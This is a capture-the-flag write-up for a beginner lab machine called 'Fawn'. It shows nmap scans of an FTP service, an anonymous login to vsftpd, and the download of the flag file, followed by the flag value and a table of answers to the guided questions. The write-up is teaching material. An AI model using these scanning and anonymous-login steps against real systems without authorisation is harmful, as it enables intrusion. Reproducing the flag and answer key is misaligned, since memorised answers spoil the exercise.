# Fawn

|            |                                                              |
|------------|--------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                      |
| Difficulty | Very Easy                                                    |
| OS         | Unix                                                         |
| Tags       | FTP, Network, Protocols, Reconnaissance, Anonymous Access    |
| Tools      | `nmap`, `ftp`                                                |

## Summary

An FTP server (vsftpd 3.0.3) that allows anonymous login. The flag is sitting
in the anonymous user's directory ready to be downloaded.

## Recon

Probe the version on port 21:

```bash
nmap -sV -p 21 10.129.57.230
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-01 15:37 AEST
Nmap scan report for 10.129.57.230
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```

OS detection (needs root) confirms a Unix host:

```bash
sudo nmap -O -p 21 10.129.57.230
```

## Foothold

vsftpd allows anonymous login by default in many configurations. Username
`anonymous` with a blank password works here.

```bash
ftp 10.129.57.230
# Name: anonymous
# Password: <blank>
```

## Flag

```bash
ftp 10.129.57.230
Connected to 10.129.57.230.
220 (vsFTPd 3.0.3)
Name (10.129.57.230:josh): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||65518|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||10748|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
ftp> exit
221 Goodbye.

cat flag.txt
035db21c881520061c53e0536e44f815
```

## Guided Tasks

| #   | Question | Answer |
|-----|----------|--------|
| 1   | What does the 3-letter acronym FTP stand for? | File Transfer Protocol |
| 2   | Which port does the FTP service listen on usually? | 21 |
| 3   | What acronym is used for the secure version of FTP? | SFTP |
| 4   | What is the command we can use to send an ICMP echo request to test our connection to the target? | ping |
| 5   | From your scans, what version is FTP running on the target? | vsftpd 3.0.3 |
| 6   | From your scans, what OS type is running on the target? | Unix |
| 7   | What is the command we need to run in order to display the 'ftp' client help menu? | `ftp -h` |
| 8   | What is the username that is used over FTP when you want to log in without having an account? | anonymous |
| 9   | What is the response code we get for the FTP message 'Login successful'? | 230 |
| 10  | There are a couple of commands we can use to list the files and directories available on the FTP server. One is `dir`. What is the other that is a common way to list files on a Linux system? | ls |
| 11  | What is the command used to download the file we found on the FTP server? | get |
| Flag | Submit root flag | `035db21c881520061c53e0536e44f815` |
